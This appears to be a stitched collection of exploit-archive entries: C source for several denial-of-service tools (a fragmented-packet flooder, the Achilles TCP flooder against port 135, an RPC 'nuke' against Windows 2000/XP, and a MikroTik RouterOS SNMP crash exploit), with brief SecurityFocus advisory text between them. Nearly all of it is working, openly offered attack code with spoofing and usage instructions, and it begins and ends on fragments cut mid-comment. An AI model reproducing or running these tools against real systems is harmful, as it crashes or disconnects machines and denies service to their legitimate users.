  Program allows choice of TCP or UDP, number of packets to fragment, number
  of fragments per packet and number of times the last fragment is
  rewritten.

  Based on a conversation where it was mentioned that a highly fragmented
  packet would cause high CPU utilization if the last fragment was written
  over and over again.

  As chuck says, death by a thousand cuts.

  NewDawn4 allows smaller fragments (8 bytes) to be sent to the host.  See:
  http://digital.net/~gandalf/Rose_Frag_Attack_Explained.htm
  
 Usage : ./NewDawn4 type(1or2) ipaddress [port] [NumP] [Numt] [NumR] [NumF] [NumD]
 Example: ./NewDawn4 1 1.2.3.4 80 5 9999 99999999 4080 2
   type      : 1=tcp, 2=udp
   ipaddress : address to test
   port      : optional port number (0 means random)
   NumP      : Number of packets to fragment (less than 1000)
   NumT      : Number of times last fragment is rewritten
   NumR      : Number of times to run test
   NumF      : Number of fragments per packet
   NumD      : Delta between fragements.  2 = 8 bytes blank
               16 bytes total between fragments (8 bytes 
	       payload + 8 bytes blank = 16 bytes),
               5 = 32 bytes blank (8 bytes payload + 32 bytes
	       blank = 40 bytes total = 5 * 8).

  Library netwib must be installed:
    http://www.laurentconstantin.com/en/netw/netwib/
    http://go.to/laurentconstantin

  To compile and run :
    gcc -Wall -o NewDawn4 NewDawn4.c `netwib-config -lc`
    ./NewDawn4 1 www.example.com 80

    The command:
    ./NewDawn4 1 10.12.14.16
    Is equivalent to:
    ./NewDawn4 1 10.12.14.16 0 5 9999 99999999 1021 8
    Where:
    ./NewDawn4 = Program Name
    1 = TCP
    10.12.14.16 = IP Address
    0 = Random port numbers
    5 = Five packets to fragment before staring next set of packets
    9999 = The number of times to rewrite the last fragment of
           the five packets
    99999999 = The number of times to run this entire attack
    1021 = The number of middle fragments to write.
    8 = 64 bytes, 8 byte data + 56 bytes blank fragments (8 bytes * 8 = 64)

  This was successfully tested with netwib 5.12.0, under Linux
  to test a Windows 2000 host. Local network is Ethernet.
*/

/*-------------------------------------------------------------*/
// Test large number of packets
#define NUM_PACKETS 1000
#define NUM_LAST 9999
#define NUM_RUN 99999999
#define NUM_FRAG 8170
#define NUM_DELTA 8

#include <stdlib.h>
#include <stdio.h>
#include <netwib.h>

/*-------------------------------------------------------------*/
typedef enum {
  ROSE_TYPE_TCP = 1,
  ROSE_TYPE_UDP = 2
} rose_type;

/*-------------------------------------------------------------*/
typedef struct {
  rose_type type;
  netwib_ip ipad;
  netwib_port port;
  netwib_bool display;
  netwib_buf buf;
  netwib_io *pio;
} rose_params;

/*-------------------------------------------------------------*/
static netwib_err rose_loop(rose_params *prp, int npack, int nrew, 
		int nrun, int nfrag, int ndelta)
{
  netwib_iphdr ipheader, ipstore[NUM_PACKETS];
  netwib_tcphdr tcpheader, tcpstore[NUM_PACKETS];
  netwib_udphdr udpheader, udpstore[NUM_PACKETS];
  netwib_buf payload;
  netwib_uint32 numsent = 0;
  int i, j, nrun2;

printf("Packets %d Rewrite %d Runs %d Fragment packet to byte %d Delta %d\n\r",
           npack, nrew, nrun, nfrag, ndelta);
  
  for (nrun2=0; nrun2<nrun; nrun2++) {

    for (i=0; i<npack; i++){
	netwib_er(netwib_iphdr_initdefault(NETWIB_IPTYPE_IP4, &ipstore[i]));
	netwib_er(netwib_uint32_init_rand_all(&ipstore[i].src.ipvalue.ip4));
	switch(prp->type) {
	case ROSE_TYPE_TCP :
        netwib_er(netwib_tcphdr_initdefault(&tcpstore[i]));
        netwib_er(netwib_uint32_init_rand(0, 0xFFFF, &tcpstore[i].src));
        if (prp->port == 0) {
          netwib_er(netwib_uint32_init_rand(0, 0xFFFF, &tcpstore[i].dst));
	} else {
	  tcpstore[i].dst = prp->port;
    	}
        break;
	case ROSE_TYPE_UDP :
	netwib_er(netwib_uint32_init_rand(0, 0xFFFF, &udpstore[i].src));
	if (prp->port == 0) {
	  netwib_er(netwib_uint32_init_rand(0, 0xFFFF, &udpstore[i].dst));
        } else {
          udpstore[i].dst = prp->port;
        }
	break;
       }
    }
    
    for (i=0; i<npack; i++){
    /* construct first fragment */
    netwib__buf_reinit(&prp->buf);
    ipheader = ipstore[i];
    ipheader.header.ip4.morefrag = NETWIB_TRUE;
    ipheader.header.ip4.offsetfrag = 0; /* not necessary, but to be clear */
    ipheader.src.iptype = NETWIB_IPTYPE_IP4;
    ipheader.src.ipvalue.ip4 = ipstore[i].src.ipvalue.ip4;
    ipheader.dst = prp->ipad;
    switch(prp->type) {
    case ROSE_TYPE_TCP :
      tcpheader = tcpstore[i];
      tcpheader.src = tcpstore[i].src;
      tcpheader.dst = tcpstore[i].dst;
      tcpheader.ack = NETWIB_TRUE;
      netwib_er(netwib_buf_init_ext_text("1234567890123456789012345678",
                                         &payload));
      netwib_er(netwib_pkt_append_iptcpdata(&ipheader, &tcpheader, &payload,
                                          &prp->buf));
      break;
    case ROSE_TYPE_UDP :
      netwib_er(netwib_udphdr_initdefault(&udpheader));
      udpheader.src = udpstore[i].src;
      udpheader.dst = udpstore[i].dst;
      netwib_er(netwib_buf_init_ext_text("12345678901234567890123456789012",
                                         &payload));
      netwib_er(netwib_pkt_append_ipudpdata(&ipheader, &udpheader, &payload,
                                            &prp->buf));
      break;
    }
    if (prp->display) {
      netwib_er(netwib_pkt_ip_display(&prp->buf, NULL, NETWIB_ENCODETYPE_ARRAY,
                                      NETWIB_ENCODETYPE_DUMP));
    }
    netwib_er(netwib_io_write(prp->pio, &prp->buf));
    
    /* construct middle fragments */
    ipheader.header.ip4.offsetfrag = 0x0008;
    for(ipheader.header.ip4.offsetfrag = 0x0008 ; 
	ipheader.header.ip4.offsetfrag< nfrag; 
	ipheader.header.ip4.offsetfrag = ipheader.header.ip4.offsetfrag + 
	                                 ndelta){
    netwib__buf_reinit(&prp->buf);
    switch(prp->type) {
    case ROSE_TYPE_TCP :
      ipheader.protocol = NETWIB_IPPROTO_TCP;
      netwib_er(netwib_buf_init_ext_text("12345678",
			                  &payload));
      break;
    case ROSE_TYPE_UDP :
      ipheader.protocol = NETWIB_IPPROTO_UDP;
      netwib_er(netwib_buf_init_ext_text("12345678",
			                  &payload));
      break;
    }
    netwib_er(netwib_pkt_append_ipdata(&ipheader, &payload, &prp->buf));
    if (prp->display) {
    netwib_er(netwib_pkt_ip_display(&prp->buf, NULL, NETWIB_ENCODETYPE_ARRAY,
				    NETWIB_ENCODETYPE_DUMP));
    }
    netwib_er(netwib_io_write(prp->pio, &prp->buf));
    }

    }

    printf("Rewriting %d packets last fragment %d times\r\n",
		    npack,nrew); fflush(stdout);

    /* construct last fragment and rewrite NUM_LAST times */
    for (j=0;j<nrew;j++){
    netwib__buf_reinit(&prp->buf);
    for (i=0; i<npack; i++){
    ipheader = ipstore[i];
    ipheader.src.iptype = NETWIB_IPTYPE_IP4;
    ipheader.src.ipvalue.ip4 = ipstore[i].src.ipvalue.ip4;
    ipheader.dst = prp->ipad;
    switch(prp->type) {
    case ROSE_TYPE_TCP :
      tcpheader = tcpstore[i];
      tcpheader.src = tcpstore[i].src;
      tcpheader.dst = tcpstore[i].dst;
      tcpheader.ack = NETWIB_TRUE;
      ipheader.protocol = NETWIB_IPPROTO_TCP;
    break;
    case ROSE_TYPE_UDP :
      udpheader.src = udpstore[i].src;
      udpheader.dst = udpstore[i].dst;
      ipheader.protocol = NETWIB_IPPROTO_UDP;
    break;
    }
    
    netwib__buf_reinit(&prp->buf);
    ipheader.header.ip4.morefrag = NETWIB_FALSE;
    ipheader.header.ip4.offsetfrag = 0x1FF0;
    netwib_er(netwib_buf_init_ext_text("1234567890123456",
                                       &payload));
    netwib_er(netwib_pkt_append_ipdata(&ipheader, &payload, &prp->buf));
    if (prp->display) {
      netwib_er(netwib_pkt_ip_display(&prp->buf, NULL, NETWIB_ENCODETYPE_ARRAY,
                                      NETWIB_ENCODETYPE_DUMP));
       }
    netwib_er(netwib_io_write(prp->pio, &prp->buf));
    }
    }
    /* dot display */
    if (!prp->display && (numsent%100)==0) {
      printf("."); fflush(stdout);
    }
    numsent++;
  }

  return(NETWIB_ERR_OK);
}

/*-------------------------------------------------------------*/
int main(int argc, char* argv[])
{
  rose_params rp;
  netwib_buf ipstr;
  netwib_err ret;
  int npack, nrew, nrun, nfrag, ndelta;

  /* initialize netwib */
  netwib_init();

  /* check parameter count */
  if (argc < 3 || argc > 9) {
    printf("Usage  : %s type(1or2) ipaddress [port] [NumP] [Numt] [NumR] [NumF] [NumD]\n", argv[0]);
    printf("Example: %s 1 1.2.3.4 80 5 9999 99999999 1021 8\n", argv[0]);
    printf(" type      : %d=tcp, %d=udp\n", ROSE_TYPE_TCP, ROSE_TYPE_UDP);
    printf(" ipaddress : address to test\n");
    printf(" port      : optional port number (0 means random)\n");
    printf(" NumP      : Number of packets to fragment\n");
    printf(" NumT      : Number of times last fragment is rewritten\n");
    printf(" NumR      : Number of times to run test\n");
    printf(" NumF      : Number of fragments per packet\n");
    printf(" NumD      : Delta between fragements.\n");
   return(1);
  }

  /* first parameter is type */
  rp.type = atoi(argv[1]);
  switch(rp.type) {
  case ROSE_TYPE_TCP :
  case ROSE_TYPE_UDP :
    break;
  default :
    printf("First parameter must be 1 or 2 (currently=%s)\n", argv[1]);
    return(2);
  }

  /* second parameter is IP address */
  netwib_er(netwib_buf_init_ext_text(argv[2], &ipstr));
  ret = netwib_ip_init_buf(&ipstr, NETWIB_IP_DECODETYPE_BEST, &rp.ipad);
  if (ret != NETWIB_ERR_OK) {
    printf("Second parameter must be an IP or hostname (currently=%s)\n",
           argv[2]);
    return(3);
  }

  /* third parameter is port number */
  rp.port = 0;
  if (argc > 3) {
    rp.port = atoi(argv[3]); /* on error, set to 0, but that's ok */
  }

  /* fourth parameter is number of packets to fragment */
  npack = 5;
  if (argc > 4) {
    npack = atoi(argv[4]); /* on error, set to 1 */
    }
  if (npack < 1) { npack = 1; }
  if (npack > 1000) { npack = 1000; }
  
  /* fifth parameter is number of times packet is rewritten */
  nrew = NUM_LAST;
  if (argc > 5) {
    nrew = atoi(argv[5]); /* on error, set to 0, but that's ok */
    }
  
  /* sixth parameter is number of times to run the test */
  nrun = NUM_RUN;
  if (argc > 6) {
    nrun = atoi(argv[6]); /* on error, set to 0, but that's ok */
    }
  
  /* seventh parameter is number of fragments per packet */
  nfrag = NUM_FRAG;
  if (argc > 7) {
    nfrag = atoi(argv[7]); 
    }
  if (nfrag < 1) { nfrag = 1; }

  /* eighth parameter is delta between fragments */
    ndelta = NUM_DELTA;
    if (argc > 8) {
      ndelta = atoi(argv[8]);
      }

  /* Make sure that the fragments do not exceed 8170 */

    nfrag = (nfrag * ndelta) + 8;
    if (nfrag > 8170) { nfrag = 8170; }
 
  printf("%s %d %s %d %d %d %d %d ndelta = %d\n\r",
          argv[0], rp.type, argv[2], rp.port, npack, nrew, nrun, 
	  nfrag / 8, ndelta);

  /* set to NETWIB_TRUE to activate display */
  rp.display = NETWIB_FALSE;

  /* instead of allocating memory each time, just use this permanent buffer */
  netwib_er(netwib_buf_init_mallocdefault(&rp.buf));

  /* initialize spoofing feature */
  netwib_er(netwib_io_init_spoof_ip(NETWIB_SPOOF_IP_INITTYPE_LINKBRAW,
                                    &rp.pio));

  /* main function */
  ret = rose_loop(&rp, npack, nrew, nrun, nfrag, ndelta);
  if (ret != NETWIB_ERR_OK) {
    netwib_er(netwib_err_display(ret, NETWIB_ERR_ENCODETYPE_FULL));
    return(ret);
  }

  /* close netwib */
  netwib_er(netwib_io_close(&rp.pio));
  netwib_er(netwib_buf_close(&rp.buf));
  netwib_close();

  return(0);
}

source: http://www.securityfocus.com/bid/19135/info

Microsoft Windows is reportedly prone to a remote denial-of-service vulnerability. This issue may be due to the operating system's failure to properly handle unexpected network traffic.

This issue may cause affected computers to crash, denying service to legitimate users.

Note that Microsoft has not been able to reproduce this issue. This BID will be updated as further analysis is performed.

/*
 * Achilles.c version2
 * Remodified Achilles Windows Attack Tool
 * compiled on FreeBSD 6.1, SuSE 10
 * Solaris 10, NetBSD 3.0,
 * Proof of Concept tool that disconnects
 * Windows machines until the program is
 * stopped. Tested locally and remotely.
 *
 * linux:~ # uname -a
 * Linux linux 2.6.13-15.10-default #1 Fri May 12 16:27:12 UTC 2006 i386 GNU/Linux
 *
 * $ uname -a
 * SunOS unknown 5.10 Generic_118822-25 sun4u sparc SUNW,Sun-Fire-280R
 *
 * -bash2-2.05b$ uname -a
 * FreeBSD hypnos 5.4-RELEASE-p14 FreeBSD 5.4-RELEASE-p14 #1: Thu May 11 01:34:54 CDT 2006 toor@hypnos:/usr/obj/usr/src/sys/HYPNOS  i386
 *
 * (c) 2006 J. Oquendo Genexsys.net::Infiltrated.net
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <strings.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>

#ifndef __USE_BSD
#define __USE_BSD

#endif

#ifndef __FAVOR_BSD

#define __FAVOR_BSD

#endif

#include <netinet/in_systm.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <netdb.h>

#ifdef LINUX
#define FIX(x) htons(x)

#else

#define FIX(x) (x)
#endif

struct ip_hdr {
    u_int ip_hl:4,
                ip_v:4;
    u_char ip_tos;
    u_short ip_len;
    u_short ip_id;
    u_short ip_off;
    u_char ip_ttl;
    u_char ip_p;
    u_short ip_sum;
    u_long saddr, daddr;
};

struct tcp_hdr {
    u_short th_sport;
    u_short th_dport;
    u_long th_seq;
    u_long th_syn;
    u_int th_x2:4,
                th_off:4;
    u_char th_flags;
    u_short th_win;
    u_short th_sum;
    u_short th_urp;
};

struct tcpopt_hdr {
    u_char type;
    u_char len;
    u_short value;
};

struct pseudo_hdr {
    u_long saddr, daddr;
    u_char mbz, ptcl;
    u_short tcpl;
};

struct packet {
    struct ip/*_hdr*/ ip;
    struct tcphdr tcp;
};

struct cksum {
    struct pseudo_hdr pseudo;
    struct tcphdr tcp;
};

struct packet packet;
struct cksum cksum;
struct sockaddr_in s_in;
u_short bgport, bgsize, pps;
u_long radd;
u_long sradd;
int sock;

void usage(char *progname)
{
    fprintf(stderr, "Usage: %s <dst> <src> <size> <number>\n", progname);
    fprintf(stderr, "dst:\tDestination Address\n");
    fprintf(stderr, "src:\tSource Address\n");
    fprintf(stderr, "size:\tSize of packet\n");
    fprintf(stderr, "num:\tpackets\n\n");
    exit(1);
}

inline u_short in_cksum(u_short *addr, int len)
{
    register int nleft = len;
    register u_short *w = addr;
    register int sum = 0;
    u_short answer = 0;
     while (nleft > 1) {
         sum += *w++;
         nleft -= 2;
     }
     if (nleft == 1) {
         *(u_char *)(&answer) = *(u_char *) w;
         sum += answer;
     }
     sum = (sum >> 16) + (sum & 0xF0F0);
     sum += (sum >> 16);
     answer = ~sum;
     return(answer);
}

u_long lookup(char *hostname)
{
    struct hostent *hp;

    if ((hp = gethostbyname(hostname)) == NULL) {
       fprintf(stderr, "Could not resolve %s\n", hostname);
       exit(1);
    }

    return *(u_long *)hp->h_addr;
}

void flooder(void)
{
    struct timespec ts;
    int i;

    memset(&packet, 0, sizeof(packet));

    ts.tv_sec = 0;
    ts.tv_nsec = 100;

    packet.ip.ip_hl = 5;
    packet.ip.ip_v = 4;
    packet.ip.ip_p = IPPROTO_TCP;
    packet.ip.ip_tos = 0xa0;
    packet.ip.ip_id = radd;
    packet.ip.ip_len = FIX(sizeof(packet));
    packet.ip.ip_off = 0;
    packet.ip.ip_ttl = 255;
    packet.ip.ip_dst.s_addr = radd;

    packet.tcp.th_flags = 0;
    packet.tcp.th_win = 65535;
    packet.tcp.th_seq = random();
    packet.tcp.th_ack = 0;
    packet.tcp.th_off = random();
    packet.tcp.th_urp = 0;
    packet.tcp.th_dport = 135;
    cksum.pseudo.daddr = sradd;
    cksum.pseudo.mbz = random(); /* WATCH ME CLOSELY */
    cksum.pseudo.ptcl = IPPROTO_TCP;
    cksum.pseudo.tcpl = random();

    s_in.sin_family = AF_INET;
    s_in.sin_addr.s_addr = sradd;
    s_in.sin_port = 135;

    for(i=0;;++i) {
    if( !(i&31337) ) {
        packet.tcp.th_sport = 135;
        cksum.pseudo.saddr = packet.ip.ip_src.s_addr = sradd;
        packet.tcp.th_flags = random();
        packet.tcp.th_ack = random();

    }
    else {
        packet.tcp.th_flags = rand();
        packet.tcp.th_ack = rand();
    }
       ++packet.ip.ip_id;
       /*++packet.tcp.th_sport*/;
       ++packet.tcp.th_seq;

       if (!bgport)
          s_in.sin_port = packet.tcp.th_dport = 135;

       packet.ip.ip_sum = 0;
       packet.tcp.th_sum = 0;

       cksum.tcp = packet.tcp;

       packet.ip.ip_sum = in_cksum((void *)&packet.ip, 20);
       packet.tcp.th_sum = in_cksum((void *)&cksum, sizeof(cksum));

       if (sendto(sock, &packet, sizeof(packet), 0, (struct sockaddr *)&s_in, sizeof(s_in)) < 0);

    }
}

int main(int argc, char *argv[])
{
    int on = 1;

    printf("Achilles.c Windows Attack Tool\n");


    if ((sock = socket(PF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
       perror("socket");
       exit(1);
    }

    setgid(getgid()); setuid(getuid());

    if (argc < 4)
       usage(argv[0]);

    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof(on)) < 0) {
       perror("setsockopt");
       exit(1);

    }

    srand((time(NULL) ^ getpid()) + getppid());

    printf("\nFinding host\n"); fflush(stdout);

    radd = lookup(argv[1]);
    bgport = atoi(argv[3]);
    bgsize = atoi(argv[4]);
    sradd = lookup(argv[2]);
    printf("Achilles: Before my time is done I will look down on your corpse and smile.\n");

    flooder();

    return 0;
}source: http://www.securityfocus.com/bid/6005/info

The Microsoft Windows RPC service contains a flaw that may allow a remote attacker to cause a denial of service. By sending a specifically malformed packet to TCP port 135, the RPC service will be disabled.

This vulnerability was originally reported to only affect Windows 2000. Microsoft has confirmed that Windows NT 4.0 and XP are also vulnerable.

It has been reported that installation of the provided patch will cause some problems in IIS environments. Specifically, users who are using COM+ in IIS environments may experience problems with ASP transactions.

A variant of this issue has been reported which allegedly affects patched systems. It is apparently possible to trigger this variant by flooding a system with malformed packets. 

/*
************************************************************************
* MS WIN RPC DoS CODE FROM SPIKE v2.7
* 
* Compile it use:
* cl winnuke.c
*
* Usage:
* winnuke targetip   
*
* Code by lion, Welcomde to HUC Website Http://www.cnhonker.com
* 2002/10/22
************************************************************************
*/

#include <winsock2.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

char sendcode1[] = 
	"\x05\x00\x0b\x03\x10\x00\x00\x00\x48\x00\x00\x00\x02\x00\x00\x00"
	"\xd0\x16\xd0\x16\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00"
	"\x60\x9e\xe7\xb9\x52\x3d\xce\x11\xaa\xa1\x00\x00\x69\x01\x29\x3f"
	"\x02\x00\x02\x00\x04\x5d\x88\x8a\xeb\x1c\xc9\x11\x9f\xe8\x08\x00"
	"\x2b\x10\x48\x60\x02\x00\x00\x00\x05\x00\x00\x01\x10\x00\x00\x00"
	"\xd0\x16\x00\x00\x8f\x00\x00\x00\x20\x27\x01\x00\x00\x00\x02\x00"
	"\xf0\x00\x00\x00\x00\x00\x00\x00\xf0\x00\x00\x00";

char sendcode2[] = 
	"\x88\x13\x00\x00\x00\x00\x00\x00\x88\x13\x00\x00";

char sendcode3[] = 
	"\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00";

char sendcode4[] = 
	"\xfe\xff\x00\x00\x00\x00\x00\x00\xfe\xff\x00\x00\x3d\x3d\x3d\x3d" 
	"\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d\x3d"
	"\x05\x00\x00\x00\x10\x00\x00\x00\xd0\x16\x00\x00\x8f\x00\x00\x00"
	"\x50\x10\x01\x00\x00\x00\x02\x00";

char sendcode5[] = 
	"\x05\x00\x00\x00\x10\x00\x00\x00\xd0\x16\x00\x00\x8f\x00\x00\x00"
	"\x80\xf9\x00\x00\x00\x00\x02\x00";

char sendcode6[] = 
	"\x05\x00\x00\x00\x10\x00\x00\x00\xd0\x16\x00\x00\x8f\x00\x00\x00"
	"\xb0\xe2\x00\x00\x00\x00\x02\x00";

char sendcode7[] = 
	"\x05\x00\x00\x02\x10\x00\x00\x00\x60\x15\x00\x00\x8f\x00\x00\x00"
	"\x60\x15\x00\x00\x00\x00\x02\x00";

char sendcode8[] = 
	"\x00\x00\x01\x10\x00\x00\x00\x00\x00\x00\x01\x10\x00\x00";

int main(int argc, char *argv[])
{
	WSADATA wsaData;
	WORD wVersionRequested;
	struct hostent 		*pTarget;
	struct sockaddr_in 	sock;
	char *targetip;
	int port,bufsize;
	SOCKET s;
	char buffer[20480];

	printf("========================= HUC Win2000/XP RPC Nuke V0.10 =======================\r\n");
	printf("================= By Lion, Welcome to http://www.cnhonker.com =================\r\n\n");

	if (argc < 2)
	{
		printf("Usage:\r\n");
		printf("    %s <TargetIP> [TargetPort]\r\n", argv[0]);
		printf("Example:\r\n");
		printf("    %s 192.168.0.1\r\n", argv[0]);
		printf("    %s 192.168.0.1 135\r\n", argv[0]);
		printf("PS:\r\n");
		printf("    If target is XP, try 2 times.\r\n");
		exit(1);
	}

	wVersionRequested = MAKEWORD(1, 1);
	if (WSAStartup(wVersionRequested, &wsaData) < 0) return -1;

	targetip = argv[1];
	port = 135;
	if (argc >= 3) port = atoi(argv[2]);
	bufsize = 512;
	if (argc >= 4) bufsize = atoi(argv[3]);

	s = socket(AF_INET, SOCK_STREAM, 0);
	if(s==INVALID_SOCKET)
	{	
		printf("Socket error!\r\n");
		exit(1);
	}

	printf("Resolving Hostnames...\n");
	if ((pTarget = gethostbyname(targetip)) == NULL)
	{
		printf("Resolve of %s failed, please try again.\n", argv[1]);
		exit(1);
	}

	memcpy(&sock.sin_addr.s_addr, pTarget->h_addr, pTarget->h_length);
	sock.sin_family = AF_INET;
	sock.sin_port = htons((USHORT)port);

	printf("Connecting...\n");
	if ( (connect(s, (struct sockaddr *)&sock, sizeof (sock) )))
	{
		printf("Couldn't connect to host.\n");
		exit(1);
	}

	printf("Connected!...\n");
	printf("Sending Packets...\n");
	if (send(s, sendcode1, sizeof(sendcode1)-1, 0) == -1)
	{
		printf("Error sending nuke Packets\r\n");
		closesocket(s);
		exit(1);
	}

	memset(&buffer, '\x41', 240);
	send(s, buffer, 240, 0);

	send(s, sendcode2, sizeof(sendcode2)-1, 0);
	memset(&buffer, '\x42', 5000);
	send(s, buffer, 5000, 0);

	send(s, sendcode3, sizeof(sendcode3)-1, 0);
	memset(&buffer, '\x43', 512);
	send(s, buffer, 512, 0);
	
	send(s, sendcode4, sizeof(sendcode4)-1, 0);
//	memset(&buffer, '\x44', 20480);
//	send(s, buffer, 20480, 0);

//	/*
	memset(&buffer, '\x44', 5000);
	send(s, buffer, 5000, 0);

	send(s, sendcode5, sizeof(sendcode5)-1, 0);
	memset(&buffer, '\x45', 5000);
	send(s, buffer, 5000, 0);

	send(s, sendcode6, sizeof(sendcode6)-1, 0);
	memset(&buffer, '\x46', 5000);
	send(s, buffer, 5000, 0);

	send(s, sendcode7, sizeof(sendcode7)-1, 0);
	memset(&buffer, '\x47', 5000);
	send(s, buffer, 5000, 0);

	send(s, sendcode8, sizeof(sendcode8)-1, 0);
	memset(&buffer, '\x48', 5000);
	send(s, buffer, 5000, 0);
	
//	*/ 
	printf("Nuked! \r\nIf target is XP, try a again! :)\r\n");
	closesocket(s);
	WSACleanup();
	return 0;
}/* --------------------------------------------------------------------------
*                          (c) ShadOS 2008
*       _  _     _ _ _  __     _      _   _      
*      | || |___| | | |/ /_ _ (_)__ _| |_| |_ ___
*      | __ / -_) | | ' <| ' \| / _` | ' \  _(_-<
*      |_||_\___|_|_|_|\_\_||_|_\__, |_||_\__/__/
*        hellknights.void.ru    |___/  .0x48k.    
*
* --------------------------------------------------------------------------
*
*  MicroTik RouterOS <=3.2 SNMPd snmp-set DoS exploit. Other OSs may be vulnurable (fe. Linux )
*  Don't forget to visit our site and my homepage for new releases:
*  http://hellknights.void.ru
*  http://shados.freeweb7.com
*  Also, you can mail me any bugs or suggestions:
*  mailto: shados /at/ mail /dot/ ru
*
*  Thanks 2 antichat.ru and all my friends.
* --------------------------------------------------------------------------
*
*  Copyright (C) 89, 90, 91, 1995-2007 Free Software Foundation.
*
*  This program is free software; you can redistribute it and/or modify
*  it under the terms of the GNU General Public License as published by
*  the Free Software Foundation; either version 2, or (at your option)
*  any later version.
*
*  This program is distributed in the hope that it will be useful,
*  but WITHOUT ANY WARRANTY; without even the implied warranty of
*  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
*  GNU General Public License for more details.
*
*  You should have received a copy of the GNU General Public License
*  along with this program; if not, write to the Free Software Foundation,
*  Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
*
* --------------------------------------------------------------------------
*/

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netdb.h>
#include <memory.h>
#include <string.h>

char evilcode[] = {
0x19, 0x02, 0x02, 0x1e, 0x0c, 0x02, 0x01, 0x00, 0x02, 0x01, 0x00, 0x30, 0x0d, 0x30, 0x0b, 0x06, 0x07, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x05, 0x00, 0x00
};


unsigned short in_cksum(addr, len)
u_short *addr;
int len;
{
  register int nleft = len;
  register u_short *w = addr;
  register int sum = 0;
  u_short answer = 0;

  while (nleft > 1) {
     sum += *w++;
     sum += *w++;
     nleft -= 2;
  }
  if (nleft == 1) {
     *(u_char *) (&answer) = *(u_char *) w;
     sum += answer;
  }
  sum = (sum >> 17) + (sum & 0xffff);
  sum += (sum >> 17);
  answer = -sum;
  return (answer);
}

int sendudp(int sock,unsigned long *saddr, unsigned long *daddr,unsigned int sport,unsigned int dport,char *data, int len)
{
  char *packet;
  struct sockaddr_in dstaddr;
  struct iphdr *ip;
  struct udphdr *udp;
  packet = (char *)malloc(sizeof(struct iphdr)+sizeof(struct udphdr)+len);
  memset(packet,0,sizeof(struct iphdr) + sizeof(struct udphdr) + len);
  if (packet == NULL) { perror("Malloc failed\n"); exit(-1); }
  ip = (struct iphdr *)packet;
  udp = (struct udphdr *)(packet+sizeof(struct iphdr));
  ip->saddr = *saddr;
  ip->daddr = *daddr;
  ip->version = 4;
  ip->ihl = 5;
  ip->ttl = 255;
  ip->id = htons((unsigned short) rand());
  ip->protocol = IPPROTO_UDP;
  ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr)+len);
  ip->check = in_cksum(ip, sizeof(struct iphdr));
  udp->source = htons(sport);
  udp->dest = htons(dport);
  udp->len = htons(sizeof(struct udphdr) + len);
  memcpy(packet+(sizeof(struct iphdr) + sizeof(struct udphdr)),data,len);
  dstaddr.sin_family = AF_INET;
  dstaddr.sin_addr.s_addr = *daddr;
  if (sendto(sock, packet, sizeof(struct iphdr) + sizeof(struct udphdr)+len,0,(struct sockaddr *)&dstaddr,sizeof(struct sockaddr_in)) < 0)
    perror("sendto() failed");
  free(packet);
}

char * makereq(char *community,int *size)
{
 char *buf;
 char *ptr;
 int len;
 int i;

 len = 5 + strlen(community) + sizeof(evilcode);
 buf = (char *)malloc(len);
 ptr = buf;

 *ptr++ = 0x30;
 *ptr++ = len;
 
 /* Snmp Version */
 *ptr++ = 0x02;
 *ptr++ = 0x01;
 *ptr++ = 0x00;
 
 /* Community */
 *ptr++ = 0x04;
 *ptr++ = strlen(community);
 strcpy(ptr,community);
 ptr = ptr + strlen(community);
 
 
 *ptr++ = 0xa3; /* Set Request */
 
 memcpy(ptr, evilcode, sizeof(evilcode));
 ptr = ptr + sizeof(evilcode);
 
 *size = len+2;
 return buf;
}

int erexit(char *msg)
{
 printf("%s\n",msg);
 exit (-1) ;
}

int usage()
{
 printf("Usage: ./snmpdos <-s source> <-d dest> <-c community>\n");
}

int main(int argc, char **argv)
{
 char *saddr,*daddr,*community;
 unsigned char *buf;
 int size;
 int sock;
 unsigned long lsaddr,ldaddr;
 int i;

 saddr = NULL;
 daddr = NULL;
 if (argc != 7) { usage(); erexit("not enough args\n"); }

 if (!strcmp(argv[1],"-s"))
   saddr = strdup(argv[2]);
 if (!strcmp(argv[3],"-d"))
   daddr = strdup(argv[4]);
 if (!strcmp(argv[5],"-c"))
   community = strdup(argv[6]);

 printf("Ok, spoofing packets from %s to %s\n",saddr,daddr);

 if (inet_addr(saddr) == -1 || inet_addr(daddr) == -1)
   erexit("Invalid source/destination IP address\n");

 if (saddr == NULL) { usage(); erexit("No Source Address"); }
 if (daddr == NULL) { usage(); erexit("No Dest Address"); }

 sock = socket(AF_INET,SOCK_RAW,IPPROTO_RAW);
 if (sock == -1)
   erexit("Couldnt open Raw socket!(Are you root?)\n");

 lsaddr = inet_addr(saddr);
 ldaddr = inet_addr(daddr);

 buf = makereq(community,&size);

 sendudp(sock,&lsaddr,&ldaddr,32788,161,buf,size);
 fprintf(stdout,"Sent packet. SNMPd must be down.\n");
 return 0;

}

// milw0rm.com [2008-02-03]
source: http://www.securityfocus.com/bid/27599/info

MikroTik RouterOS is prone to a denial-of-service vulnerability. An attacker can exploit this issue to crash an affected router, denying service to legitimate users.

This issue affects versions up to and including RouterOS 3.2. 

/* --------------------------------------------------------------------------
*                          (c) ShadOS 2008
*       _  _     _ _ _  __     _      _   _      
*      | || |___| | | |/ /_ _ (_)__ _| |_| |_ ___
*      | __ / -_) | | ' <| ' \| / _` | ' \  _(_-<
*      |_||_\___|_|_|_|\_\_||_|_\__, |_||_\__/__/
